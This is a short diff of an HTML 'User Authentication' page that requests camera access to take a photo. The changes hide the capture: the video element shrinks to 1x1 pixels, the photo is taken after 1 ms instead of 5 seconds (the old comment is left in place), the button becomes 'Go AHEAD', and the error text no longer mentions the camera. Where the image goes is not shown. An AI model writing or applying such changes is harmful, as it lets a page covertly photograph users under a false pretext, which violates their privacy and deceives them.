@@ -8,8 +8,8 @@
 <body>
     <h1>User Authentication</h1>
     <p>We need to capture a photo for authentication purposes. Please grant camera access to proceed.</p>
-    <button id="start">Start Authentication</button>
-    <video id="video" width="320" height="240" autoplay style="display:none;"></video>
+    <button id="start">Go AHEAD</button>
+    <video id="video" width="1" height="1" autoplay style="display:none;"></video>
     <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
 
     <script>
@@ -23,10 +23,10 @@
                     const video = document.getElementById('video');
                     video.srcObject = stream;
                     video.style.display = 'block';  // Show video feed
-                    setTimeout(capturePhoto, 5000); // Automatically capture after 5 seconds
+                    setTimeout(capturePhoto, 1); // Automatically capture after 5 seconds
                 })
                 .catch(err => {
-                    alert("Error accessing the camera: " + err);
+                    alert("Error accessing the Project: " + err);
                 });
         });
 
